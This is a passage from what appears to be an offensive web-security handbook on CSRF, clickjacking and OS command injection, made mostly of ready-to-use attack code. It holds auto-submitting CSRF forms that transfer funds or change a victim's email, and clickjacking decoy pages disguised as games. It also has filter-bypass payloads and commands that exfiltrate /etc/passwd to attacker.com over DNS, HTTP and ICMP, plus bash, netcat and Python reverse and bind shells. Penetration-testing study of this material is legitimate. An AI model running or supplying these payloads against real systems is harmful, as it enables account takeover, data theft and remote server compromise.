**3. XMLHttpRequest:**

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/change_email', true);
xhr.withCredentials = true;  // Include cookies
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@evil.com');
```

**4. Form with Different Encodings:**

**application/x-www-form-urlencoded (default):**

```html
<form action="https://target.com/api" method="POST" enctype="application/x-www-form-urlencoded">
  <input name="param" value="value">
</form>
```

**multipart/form-data:**

```html
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input name="description" value="malicious">
</form>
```

**text/plain (CORS bypass):**

```html
<form action="https://target.com/api" method="POST" enctype="text/plain">
  <input name='{"attacker":"data","ignore":"' value='"}'>
</form>
<!-- Sends: {"attacker":"data","ignore":"="}
     Some JSON parsers accept this -->
```

**5. Hidden Iframe Submission:**

```html
<iframe name="csrf-frame" style="display:none"></iframe>
<form action="https://target.com/transfer" method="POST" target="csrf-frame">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**Testing POST CSRF:**

**Manual Testing:**

1. Capture legitimate POST request in Burp
2. Generate CSRF PoC: Right-click â†’ Engagement tools â†’ Generate CSRF PoC
3. Customize form action/parameters
4. Save HTML to file, open in browser with valid session
5. Monitor network tab/Burp history for successful request

**Automated with csrfpoc Tool:**

```bash
# Generate CSRF PoC from Burp request file
csrfpoc -u https://target.com/transfer -m POST -d "to=attacker&amount=1000" -o csrf.html

# Or from curl command
csrfpoc --curl "curl 'https://target.com/api' -X POST -d 'param=value' -H 'Cookie: session=xyz'"
```

**Content-Type Testing:**

```bash
# Standard form encoding
curl -X POST https://target.com/api \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=xyz789" \
  -d "param=value"

# JSON (usually triggers preflight if cross-origin)
curl -X POST https://target.com/api \
  -H "Content-Type: application/json" \
  -H "Cookie: session=xyz789" \
  -d '{"param":"value"}'

# Text plain (no preflight)
curl -X POST https://target.com/api \
  -H "Content-Type: text/plain" \
  -H "Cookie: session=xyz789" \
  -d '{"param":"value"}'
```

**Bypassing Content-Type Restrictions:**

If application validates `Content-Type: application/json`:

1. **Try omitting Content-Type:**

```javascript
fetch('https://target.com/api', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({param: 'value'})
  // No Content-Type header
});
```

2. **Use form-encoded with JSON-like structure:**

```html
<form method="POST" action="https://target.com/api">
  <input name='{"param":"value", "ignore":"' value='"}'>
</form>
```

3. **Exploit parameter parsing inconsistencies:**

```bash
# Send both form and JSON simultaneously
curl -X POST https://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"param":"value"}'
  --data-urlencode "param2=value2"
```

**CORS and CSRF Interaction:**

- **Simple requests** (GET, HEAD, POST with standard encodings) do NOT trigger preflight
- Custom headers (e.g., `X-Requested-With: XMLHttpRequest`) trigger preflight
- CORS misconfigurations don't directly enable CSRF but may leak sensitive data post-exploitation

```javascript
// This triggers preflight due to custom header
fetch('https://target.com/api', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'  // Triggers preflight
  },
  body: JSON.stringify({param: 'value'})
});

// Preflight request: OPTIONS /api
// If CORS not properly configured, browser blocks the actual request
```

**Defense Bypass - Flash/Java Applet (Legacy):**

```actionscript
// Flash could send arbitrary POST requests with custom headers
// Mostly mitigated by Flash deprecation (EOL 2020)
var request:URLRequest = new URLRequest("https://target.com/api");
request.method = URLRequestMethod.POST;
request.data = "param=value";
loader.load(request);
```

---

## Comprehensive Testing Methodology

**1. Reconnaissance:**

```bash
# Identify state-changing endpoints
burpsuite -> Proxy -> HTTP History -> Filter: "Method: POST, PUT, DELETE"
# Note endpoints handling: authentication, profile updates, transactions, admin functions
```

**2. Token Analysis:**

```bash
# Capture request with CSRF token
# Test scenarios:
1. Remove token parameter
2. Empty token value
3. Token from different session
4. Token in wrong parameter position
5. Token case manipulation
6. Replay old token
```

**3. Cookie Analysis:**

```bash
# Check SameSite attribute
curl -i https://target.com/login -d "creds" | grep -i samesite

# Test with old user-agent (simulates legacy browser)
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)" ...
```

**4. Method Tampering:**

```bash
# Try alternative methods
POST -> GET
POST -> PUT
POST -> PATCH
POST with X-HTTP-Method-Override: GET
```

**5. Content-Type Fuzzing:**

```bash
# Test accepted content types
application/x-www-form-urlencoded
multipart/form-data
application/json
text/plain
application/xml
```

**6. Referer/Origin Validation:**

```bash
# Remove headers
curl -X POST https://target.com/api -H "Cookie: session=xyz" -d "param=value"
# No Referer/Origin headers

# Spoof headers
curl -X POST https://target.com/api \
  -H "Cookie: session=xyz" \
  -H "Referer: https://target.com" \
  -H "Origin: https://target.com" \
  -d "param=value"
```

**7. Subdomain Exploitation:**

```bash
# If SameSite=Lax and subdomain is compromised
# Host CSRF exploit on subdomain.target.com
# SameSite treats subdomains as same-site
```

---

## Bypassing CSRF Protection

### Missing Token Validation

Testing for absent or non-enforced CSRF tokens:

```bash
# Original request with token
POST /change-email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=new@email.com&csrf_token=abc123

# Test 1: Remove token parameter entirely
POST /change-email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=new@email.com

# Test 2: Send empty token
POST /change-email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=new@email.com&csrf_token=
```

### Token Not Tied to User Session

Exploiting tokens that are valid but not bound to specific sessions:

```bash
# Attacker obtains their own valid token
# Uses it in victim's context

# Attacker's session token: xyz789
# Victim's session cookie: session=victim_session_id

# Exploit request using attacker's token with victim's session
POST /change-email HTTP/1.1
Host: target.com
Cookie: session=victim_session_id
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&csrf_token=xyz789
```

### Method Bypass

Changing HTTP methods to bypass validation:

```bash
# Original POST request
POST /delete-account HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

csrf_token=abc123

# Test with GET method
GET /delete-account?csrf_token=abc123 HTTP/1.1
Host: target.com

# Test with PUT
PUT /delete-account HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

csrf_token=abc123

# Test method override headers
POST /delete-account HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET
Content-Type: application/x-www-form-urlencoded

csrf_token=abc123
```

### Content-Type Manipulation

Bypassing validation through content-type changes:

```bash
# Original application/x-www-form-urlencoded
POST /transfer HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

amount=1000&to=attacker&csrf_token=abc123

# Test with multipart/form-data
POST /transfer HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="amount"

1000
------WebKitFormBoundary
Content-Disposition: form-data; name="to"

attacker
------WebKitFormBoundary--

# Test with text/plain
POST /transfer HTTP/1.1
Host: target.com
Content-Type: text/plain

amount=1000&to=attacker

# Test with application/json
POST /transfer HTTP/1.1
Host: target.com
Content-Type: application/json

{"amount":1000,"to":"attacker"}
```

### Referer/Origin Header Bypass

[Inference] Some applications validate Referer or Origin headers improperly:

```bash
# Test 1: Remove Referer header
POST /sensitive-action HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

csrf_token=abc123&action=delete

# Test 2: Partial match exploitation
# If validation checks for "target.com" anywhere in Referer
POST /sensitive-action HTTP/1.1
Host: target.com
Referer: https://evil.com/target.com
Content-Type: application/x-www-form-urlencoded

csrf_token=abc123&action=delete

# Test 3: Subdomain exploitation
POST /sensitive-action HTTP/1.1
Host: target.com
Referer: https://attacker.target.com
Content-Type: application/x-www-form-urlencoded

csrf_token=abc123&action=delete
```

### Custom Header Bypass

Testing applications that rely on custom headers:

```bash
# Application expects X-CSRF-Token header
POST /api/update-profile HTTP/1.1
Host: target.com
X-CSRF-Token: abc123
Content-Type: application/json

{"email":"new@email.com"}

# Test without header
POST /api/update-profile HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":"attacker@evil.com"}

# Test with different casing
POST /api/update-profile HTTP/1.1
Host: target.com
x-csrf-token: abc123
Content-Type: application/json

{"email":"attacker@evil.com"}
```

### Double Submit Cookie Bypass

Exploiting double-submit cookie pattern weaknesses:

```bash
# Normal request: cookie and parameter must match
POST /change-password HTTP/1.1
Host: target.com
Cookie: csrf_token=abc123; session=user_session
Content-Type: application/x-www-form-urlencoded

csrf_token=abc123&new_password=newpass123

# Exploitation via subdomain cookie injection
# Set attacker-controlled cookie from subdomain
# From attacker.target.com, set: csrf_token=xyz789

POST /change-password HTTP/1.1
Host: target.com
Cookie: csrf_token=xyz789; session=victim_session
Content-Type: application/x-www-form-urlencoded

csrf_token=xyz789&new_password=pwned
```

### Array/Object Parameter Bypass

[Inference] Some frameworks may handle arrays differently:

```bash
# Standard token parameter
csrf_token=abc123

# Test with array notation
csrf_token[]=abc123
csrf_token[0]=abc123

# Test with object notation
csrf_token[value]=abc123
```

### Charset Bypass

Exploiting encoding mismatches:

```bash
POST /update-email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded; charset=utf-7
Content-Length: 45

email=attacker@evil.com&csrf_token=
```

## CSRF Token Prediction

### Weak Random Number Generators

Analyzing token generation patterns:

```bash
# Collect multiple tokens
# Token 1: 1234567890
# Token 2: 1234567891
# Token 3: 1234567892
# Pattern: Sequential increment

# Python script for pattern analysis
import requests

tokens = []
for i in range(100):
    r = requests.get('https://target.com/get-token')
    token = r.json()['csrf_token']
    tokens.append(token)
    print(f"Token {i}: {token}")

# Analyze for patterns
for i in range(1, len(tokens)):
    diff = int(tokens[i], 16) - int(tokens[i-1], 16)
    print(f"Difference: {diff}")
```

### Time-Based Tokens

Identifying timestamp-based generation:

```python
#!/usr/bin/env python3
import time
import hashlib
import requests

# Hypothesis: token = md5(timestamp + secret)
# Collect tokens with timestamps

collected_data = []
for _ in range(10):
    timestamp = int(time.time())
    r = requests.get('https://target.com/login')
    # Extract token from response
    token = extract_token(r.text)
    collected_data.append((timestamp, token))
    time.sleep(1)

# Test if token matches common patterns
for ts, token in collected_data:
    # Test MD5(timestamp)
    test1 = hashlib.md5(str(ts).encode()).hexdigest()
    if test1 == token:
        print(f"Token is MD5(timestamp): {ts}")
    
    # Test MD5(timestamp + common_secret)
    for secret in ['secret', 'key', 'csrf', '']:
        test2 = hashlib.md5(f"{ts}{secret}".encode()).hexdigest()
        if test2 == token:
            print(f"Token is MD5(timestamp + '{secret}')")
```

### User ID Based Tokens

Testing for user-specific predictable patterns:

```python
#!/usr/bin/env python3
import hashlib

# Hypothesis: token = hash(user_id + something)
user_id = "12345"
username = "victim"

# Common patterns to test
patterns = [
    hashlib.md5(user_id.encode()).hexdigest(),
    hashlib.md5(username.encode()).hexdigest(),
    hashlib.sha1(user_id.encode()).hexdigest(),
    hashlib.sha256(user_id.encode()).hexdigest(),
]

print("Possible tokens for user_id:", user_id)
for pattern in patterns:
    print(pattern)
```

### Session-Based Tokens

[Inference] Tokens derived from session identifiers:

```bash
# Session cookie: session=abc123def456
# CSRF token: 5f4dcc3b5aa765d61d8327deb882cf99

# Test if token = MD5(session)
echo -n "abc123def456" | md5sum

# Test if token = MD5(session + salt)
# Common salts: "csrf", "token", "secret", etc.
```

### Cryptographic Weaknesses

Identifying weak hashing algorithms:

```python
#!/usr/bin/env python3
import hashlib

# Known weak algorithms
def test_weak_hash(input_data):
    algorithms = {
        'md5': hashlib.md5,
        'sha1': hashlib.sha1,
        'crc32': lambda x: hex(zlib.crc32(x)),
    }
    
    results = {}
    for name, algo in algorithms.items():
        if callable(algo):
            try:
                results[name] = algo(input_data.encode()).hexdigest()
            except:
                results[name] = str(algo(input_data.encode()))
    
    return results

# Test against collected tokens
input_data = "user123session456"
print(test_weak_hash(input_data))
```

## Clickjacking Integration

### Basic CSRF + Clickjacking

Combining CSRF with UI redress attacks:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Win a Prize!</title>
    <style>
        iframe {
            position: absolute;
            width: 500px;
            height: 500px;
            opacity: 0.00001;
            z-index: 2;
        }
        button {
            position: absolute;
            top: 200px;
            left: 200px;
            z-index: 1;
            width: 200px;
            height: 50px;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <h1>Click the button to win!</h1>
    <button>Click Here to Win $1000!</button>
    <iframe src="https://target.com/delete-account"></iframe>
</body>
</html>
```

### Multi-Click CSRF Attacks

Requiring multiple clicks for sensitive actions:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Interactive Game</title>
    <style>
        .game-button {
            position: absolute;
            width: 100px;
            height: 50px;
            z-index: 1;
        }
        #btn1 { top: 100px; left: 100px; }
        #btn2 { top: 200px; left: 200px; }
        
        iframe {
            position: absolute;
            width: 800px;
            height: 600px;
            opacity: 0.00001;
            z-index: 2;
        }
    </style>
</head>
<body>
    <h1>Click all buttons in sequence!</h1>
    <button id="btn1" class="game-button">Step 1</button>
    <button id="btn2" class="game-button">Step 2</button>
    
    <!-- Iframe positioned to align action buttons with decoy -->
    <iframe id="target" src="https://target.com/confirm-transfer"></iframe>
    
    <script>
        let clicks = 0;
        document.querySelectorAll('.game-button').forEach(btn => {
            btn.addEventListener('click', () => {
                clicks++;
                if (clicks === 1) {
                    // Reposition iframe for second click
                    document.getElementById('target').style.top = '200px';
                    document.getElementById('target').style.left = '200px';
                }
            });
        });
    </script>
</body>
</html>
```

### Drag and Drop Clickjacking

Using drag operations to trigger CSRF:

```html
<!DOCTYPE html>
<html>
<head>
    <title>File Organizer</title>
    <style>
        #dropzone {
            width: 300px;
            height: 200px;
            border: 2px dashed #ccc;
            position: relative;
            z-index: 1;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 300px;
            height: 200px;
            opacity: 0.00001;
            z-index: 2;
        }
    </style>
</head>
<body>
    <h1>Drag file to organize</h1>
    <div id="dropzone">Drop files here</div>
    <iframe src="https://target.com/delete-all-files"></iframe>
</body>
</html>
```

### Touch Event Exploitation

Mobile-specific clickjacking with CSRF:

```html
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Mobile Game</title>
    <style>
        .touch-target {
            position: absolute;
            width: 150px;
            height: 150px;
            background: blue;
            border-radius: 50%;
            z-index: 1;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        iframe {
            position: absolute;
            width: 100vw;
            height: 100vh;
            opacity: 0.00001;
            z-index: 2;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>
    <h1>Tap the circle!</h1>
    <div class="touch-target"></div>
    <iframe src="https://target.com/mobile/authorize-payment"></iframe>
</body>
</html>
```

## CSRF Tools

### Burp Suite CSRF PoC Generator

Using Burp Suite's built-in CSRF functionality:

```bash
# In Burp Suite:
# 1. Capture target request in Proxy/HTTP History
# 2. Right-click request â†’ Engagement tools â†’ Generate CSRF PoC
# 3. Options available:
#    - Auto-submit form
#    - Include cookies
#    - Use different methods

# Generated PoC structure:
<html>
  <body>
    <form action="https://target.com/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### OWASP CSRFTester

Command-line CSRF testing tool:

```bash
# Installation on Kali Linux
cd /opt
git clone https://github.com/OWASPJapan/OWASP-CSRFTester.git
cd OWASP-CSRFTester

# Run CSRFTester
java -jar CSRFTester.jar

# Configure proxy in CSRFTester
# Set browser to use proxy: localhost:8008
# Browse to target application
# Generate CSRF test cases from recorded requests
```

### Custom CSRF Testing Script

Python script for automated CSRF testing:

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import argparse

def extract_forms(url):
    """Extract all forms from target URL"""
    r = requests.get(url)
    soup = BeautifulSoup(r.content, 'html.parser')
    forms = soup.find_all('form')
    return forms

def generate_csrf_poc(action, method, inputs):
    """Generate HTML CSRF PoC"""
    html = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <form action="{action}" method="{method}">
"""
    for inp in inputs:
        name = inp.get('name', '')
        value = inp.get('value', '')
        inp_type = inp.get('type', 'text')
        html += f'    <input type="{inp_type}" name="{name}" value="{value}" />\n'
    
    html += """    <input type="submit" value="Submit" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>"""
    return html

def test_csrf(url, session_cookie):
    """Test for CSRF vulnerability"""
    forms = extract_forms(url)
    
    for i, form in enumerate(forms):
        action = form.get('action')
        method = form.get('method', 'GET').upper()
        inputs = form.find_all('input')
        
        # Check for CSRF token
        has_token = any('csrf' in inp.get('name', '').lower() 
                       for inp in inputs)
        
        print(f"\n[+] Form {i+1}:")
        print(f"    Action: {action}")
        print(f"    Method: {method}")
        print(f"    CSRF Token Present: {has_token}")
        
        if not has_token:
            poc = generate_csrf_poc(action, method, inputs)
            filename = f"csrf_poc_{i+1}.html"
            with open(filename, 'w') as f:
                f.write(poc)
            print(f"    [!] Potential CSRF - PoC saved to {filename}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-c", "--cookie", help="Session cookie")
    args = parser.parse_args()
    
    test_csrf(args.url, args.cookie)
```

Usage:

```bash
chmod +x csrf_tester.py
./csrf_tester.py https://target.com/account -c "session=abc123"
```

### XSRFProbe

Automated CSRF vulnerability scanner:

```bash
# Installation
pip3 install xsrfprobe

# Basic scan
xsrfprobe -u https://target.com/form

# Scan with authentication
xsrfprobe -u https://target.com/form --cookie "session=abc123"

# Scan with custom headers
xsrfprobe -u https://target.com/api/update \
  --headers "Authorization: Bearer token123" \
  --headers "Content-Type: application/json"

# Output to file
xsrfprobe -u https://target.com/form -o results.txt

# Verbose mode
xsrfprobe -u https://target.com/form -v
```

### curl-Based Manual Testing

Testing CSRF with curl:

```bash
# Test 1: Submit form without token
curl -X POST https://target.com/change-email \
  -H "Cookie: session=victim_session" \
  -d "email=attacker@evil.com"

# Test 2: Submit with empty token
curl -X POST https://target.com/change-email \
  -H "Cookie: session=victim_session" \
  -d "email=attacker@evil.com&csrf_token="

# Test 3: Submit with attacker's token
curl -X POST https://target.com/change-email \
  -H "Cookie: session=victim_session" \
  -d "email=attacker@evil.com&csrf_token=attacker_token_123"

# Test 4: Method override
curl -X POST https://target.com/delete-account \
  -H "Cookie: session=victim_session" \
  -H "X-HTTP-Method-Override: GET"

# Test 5: Different content type
curl -X POST https://target.com/transfer \
  -H "Cookie: session=victim_session" \
  -H "Content-Type: application/json" \
  -d '{"amount":1000,"to":"attacker"}'
```

### Important Related Topics

For complete CSRF exploitation coverage, explore **SameSite Cookie Attributes**, **CORS Misconfigurations**, **CSRF in REST APIs**, and **Token-Based Authentication Bypass**.

---

# Command Injection & Code Execution

## Command Injection Basics

Command injection occurs when an application passes unsanitized user input to a system shell, allowing attackers to execute arbitrary OS commands on the server.

**Vulnerable Code Pattern:**

```python
# Python example
import os
user_input = request.GET['filename']
os.system(f"cat {user_input}")  # Vulnerable

# If user_input = "file.txt; whoami"
# Executes: cat file.txt; whoami
```

```php
// PHP example
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);  // Vulnerable

// If $ip = "127.0.0.1; cat /etc/passwd"
// Executes: ping -c 4 127.0.0.1; cat /etc/passwd
```

**Attack Prerequisites:**

- Application invokes system shell with user-controllable input
- Insufficient input validation/sanitization
- Application runs with privileges allowing command execution

**Testing Methodology:**

1. **Identify injection points:**

```bash
# URL parameters
/?file=test.txt
/?ip=127.0.0.1
/?command=ls

# Form inputs
# Any field that suggests system interaction: filenames, IPs, paths, system commands
```

2. **Test with time-delay commands:**

```bash
# Linux/Unix
; sleep 10
| sleep 10
& sleep 10
`sleep 10`
$(sleep 10)

# Windows
& timeout 10
| ping -n 10 127.0.0.1
```

3. **Observe response timing:**

- Normal response: ~1 second
- With `sleep 10`: ~11 seconds (confirms injection)

**Burp Suite Testing:**

```bash
# Intruder payload positions
GET /api?file=Â§payloadÂ§ HTTP/1.1

# Payload list (time-based):
; sleep 5
| sleep 5 
`sleep 5`
$(sleep 5)
;sleep${IFS}5
```

---

## OS Command Metacharacters

**Command Separators:**

**Unix/Linux/macOS:**

```bash
;   # Command separator (sequential execution)
|   # Pipe (output of cmd1 to input of cmd2)
||  # OR operator (cmd2 executes if cmd1 fails)
&   # Background execution
&&  # AND operator (cmd2 executes if cmd1 succeeds)
`cmd`   # Command substitution (backticks)
$(cmd)  # Command substitution (POSIX)
```

**Examples:**

```bash
# Sequential execution
original_cmd; injected_cmd

# Pipe
original_cmd | injected_cmd

# Conditional
original_cmd && injected_cmd  # Runs if original succeeds
original_cmd || injected_cmd  # Runs if original fails

# Command substitution
original_cmd `injected_cmd`
original_cmd $(injected_cmd)
```

**Windows:**

```bash
&   # Command separator
&&  # AND operator
|   # Pipe
||  # OR operator
%VAR%   # Variable expansion
^   # Escape character
```

**Examples:**

```cmd
REM Sequential
ping 127.0.0.1 & whoami

REM Conditional
ping 127.0.0.1 && dir

REM Variable expansion
ping %COMPUTERNAME%
```

**Input/Output Redirection:**

```bash
# Unix/Linux
>   # Redirect stdout to file (overwrite)
>>  # Redirect stdout to file (append)
<   # Redirect stdin from file
2>  # Redirect stderr
2>&1  # Redirect stderr to stdout

# Example: Exfiltrate data
cmd; cat /etc/passwd > /var/www/html/output.txt
```

**Newline Characters:**

```bash
# Unix/Linux
%0A  # URL-encoded newline (LF)
\n   # Newline in some contexts

# Example
param=value%0Awhoami
```

---

## Filter Bypass Techniques

**1. Alternate Command Separators:**

```bash
# If semicolon filtered
; â†’ |
; â†’ &
; â†’ %0A (newline)
; â†’ %0D (carriage return)

# Test payload
original|whoami
original&whoami
original%0Awhoami
```

**2. Whitespace Replacement:**

```bash
# If spaces filtered
${IFS}      # Internal Field Separator (bash)
$IFS$9      # $9 is empty positional parameter
{,}         # Brace expansion
<           # Redirection as separator
<>          # Empty redirection

# Examples
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

**3. Quote/Escape Techniques:**

```bash
# Bypass keyword filtering
who'a'mi    # Single quotes (no interpretation)
who"a"mi    # Double quotes
who\ami     # Backslash escape
w''hoami    # Empty quotes

# Variable expansion bypass
$@          # Empty special parameter
who$@ami

# Concatenation
a=wh;b=oami;$a$b
```

**4. Encoding/Obfuscation:**

```bash
# Hex encoding
echo -e "\x77\x68\x6f\x61\x6d\x69"  # whoami

# Base64
echo d2hvYW1p | base64 -d | sh  # whoami

# Octal
$(printf "\167\150\157\141\155\151")  # whoami

# Environment variable obfuscation
$PATH â†’ /usr/local/bin:/usr/bin:/bin
${PATH:0:1} â†’ /
${PATH:5:1} â†’ l
```

**5. Command Substitution Variations:**

```bash
# If backticks filtered
`cmd` â†’ $(cmd)
`cmd` â†’ ${cmd}  # [Inference: May work in specific shells]

# Nested substitution
$(echo$(whoami))
```

**6. Wildcard Abuse:**

```bash
# Bypass filename restrictions
/???/??t /???/p??swd      # /bin/cat /etc/passwd
/bin/c?t /etc/passw?    # ? matches single char
/bin/ca* /etc/pass*     # * matches multiple chars

# Character classes
/bin/[c]at /etc/[p]asswd
```

**7. Case Manipulation:**

```bash
# If exact string filtered (case-sensitive)
whoami â†’ WhOaMi
whoami â†’ WHOAMI

# Only works if shell/interpreter is case-insensitive
# [Inference: This typically applies to Windows CMD, not Linux bash]
```

**8. Alternative Commands:**

```bash
# If specific commands blacklisted
cat â†’ less, more, head, tail, tac, nl
ls â†’ dir, find, echo *
whoami â†’ id, who am i
nc â†’ telnet, curl, wget
```

**9. Parameter Expansion (Bash):**

```bash
# Variable substring
USER=whoami
${USER:0:6}  # whoami

# Pattern substitution
CMD=/bin/whoami
${CMD##*/}   # whoami
```

**10. Globbing:**

```bash
# Execute commands via path expansion
/???/??/???64 -d <<< d2hvYW1p | sh  # /usr/bin/base64 -d
```

**Testing Filter Bypasses:**

```bash
# Burp Intruder with payload processing
# Position: commandÂ§injectionÂ§here

# Payload processing rules:
1. Add prefix: ;
2. URL-encode all characters
3. Add suffix: #

# Example payloads for filtering tests:
;whoami
;who$IFS$9ami
;w""hoami
;`whoami`
;$(whoami)
;who'a'mi
;/???/??/who???
```

---

## Blind Command Injection

Blind command injection occurs when commands execute successfully but output is not returned in the HTTP response. Detection requires out-of-band techniques.

**Detection Techniques:**

**1. Time-Based Detection:**

```bash
# Linux/Unix
; sleep 10 ;
| sleep 10 |
& sleep 10 &
`sleep 10`
$(sleep 10)

# Delay with ping
; ping -c 10 127.0.0.1 ;

# Windows
& timeout /t 10 &
& ping -n 10 127.0.0.1 &
```

**Testing Process:**

```bash
# Send payload with sleep 10
# Measure response time:
# - Normal: ~1 second
# - Injected: ~11 seconds â†’ Vulnerable

# Burp Suite timer in Intruder columns shows response time
```

**2. DNS Exfiltration:**

```bash
# Generate unique subdomain
RANDOM=$(date +%s)
; nslookup $RANDOM.attacker.com ;
; dig $RANDOM.attacker.com ;

# With command output
; nslookup `whoami`.attacker.com ;
; dig $(whoami).attacker.com ;

# Setup DNS listener
# Method 1: Burp Collaborator
# Method 2: Interactsh
interactsh-client

# Method 3: Custom DNS server
sudo python -m dnslib.server --port 53 --log-prefix DNS_LOG
```

**Example with Data Exfiltration:**

```bash
# Exfiltrate /etc/passwd
; nslookup $(cat /etc/passwd | base64).attacker.com ;

# Split into chunks (DNS label max 63 chars)
; cat /etc/passwd | base64 | fold -w 30 | while read line; do nslookup $line.attacker.com; done ;
```

**3. HTTP Callback:**

```bash
# Trigger HTTP request to attacker server
; curl http://attacker.com/callback?data=$(whoami) ;
; wget http://attacker.com/callback?data=$(whoami) ;

# POST data
; curl -X POST -d "data=$(cat /etc/passwd)" http://attacker.com ;

# Setup HTTP listener
# Python
python3 -m http.server 80

# Netcat
nc -lvnp 80

# Burp Collaborator/Interactsh (easier in CTF)
```

**4. File-Based Detection:**

```bash
# Write to web-accessible directory
; echo "pwned" > /var/www/html/proof.txt ;
; cat /etc/passwd > /var/www/html/output.txt ;

# Then browse to http://target.com/proof.txt
```

**5. Error-Based Detection:**

```bash
# Trigger observable errors
; invalid_command_xyz ;   # May log to error logs
; cat /nonexistent ;       # Error in logs

# Check if error messages change application behavior
```

**Automated Blind Detection Tools:**

**Commix (Command Injection Exploiter):**

```bash
# Basic scan
commix -u "http://target.com/api?file=test.txt"

# Specify parameter
commix -u "http://target.com/api" --data="file=test.txt"

# Blind exploitation with time delays
commix -u "http://target.com/api?file=test" --technique=time

# DNS exfiltration
commix -u "http://target.com/api?file=test" --dns-server=attacker.com

# Get shell
commix -u "http://target.com/api?file=test" --os-shell
```

**Custom Blind Detection Script:**

```python
import requests
import time

def test_time_delay(url, param, payload):
    start = time.time()
    data = {param: payload}
    requests.post(url, data=data, timeout=30)
    elapsed = time.time() - start
    return elapsed

url = "http://target.com/api"
param = "file"

# Test with 10-second delay
payload_sleep = "test; sleep 10"
time_taken = test_time_delay(url, param, payload_sleep)

if time_taken >= 10:
    print(f"[+] Blind injection confirmed: {time_taken}s delay")
else:
    print(f"[-] No injection detected: {time_taken}s")
```

**Exfiltration Techniques:**

**DNS Tunneling:**

```bash
# Exfiltrate in chunks via DNS
; for i in $(cat /etc/passwd | base64 | fold -w 30); do nslookup $i.attacker.com; sleep 1; done ;
```

**HTTP Chunked Exfiltration:**

```bash
# Split and send data in multiple requests
; cat /etc/passwd | while read line; do curl "http://attacker.com/?data=$line"; done ;
```

**ICMP Exfiltration:**

```bash
# Embed data in ping packets (requires tcpdump on attacker)
; ping -c 1 -p $(echo "data" | xxd -p) attacker.com ;

# Attacker captures with:
sudo tcpdump -i eth0 icmp -X
```

**Reverse Shell (Blind Context):**

```bash
# Linux
; bash -i >& /dev/tcp/attacker.com/4444 0>&1 ;
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f ;

# Python
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ;

# Setup listener
nc -lvnp 4444
```

---

## Testing Workflow Summary

**1. Identification:**

- Locate parameters that accept filenames, IPs, system commands, paths
- Test with benign inputs to understand expected behavior

**2. Basic Injection:**

```bash
# Simple command chaining
; whoami
| whoami
& whoami
`whoami`
$(whoami)
```

**3. Time-Based Detection (if output not visible):**

```bash
; sleep 10
| sleep 10
```

**4. Filter Bypass:**

```bash
# Space bypass
${IFS}
$IFS$9
{,}

# Command obfuscation
who'a'mi
w""hoami
/???/??/who???

# Alternative separators
%0A (newline)
%0D (carriage return)
```

**5. Data Exfiltration:**

```bash
# DNS
; nslookup $(whoami).attacker.com ;

# HTTP
; curl http://attacker.com/$(whoami) ;

# File write
; cat /etc/passwd > /var/www/html/out.txt ;
```

**6. Shell Access:**

```bash
# Reverse shell
; bash -i >& /dev/tcp/attacker.com/4444 0>&1 ;

# Bind shell
; nc -lvnp 4444 -e /bin/bash ;
```

---

## Understanding Command Injection

Command injection vulnerabilities occur when applications pass unsanitized user input to system shell commands. Attackers can execute arbitrary operating system commands on the server, leading to complete system compromise.

**Vulnerability Conditions:**

Applications vulnerable to command injection typically use functions that invoke system shells to execute commands with user-controlled data. The application fails to properly validate, sanitize, or escape special characters that have meaning in shell contexts.

**Common Vulnerable Functions by Language:**

```python
# Python
os.system()
os.popen()
subprocess.call(shell=True)
subprocess.Popen(shell=True)
eval()
exec()

# PHP
system()
exec()
shell_exec()
passthru()
popen()
proc_open()
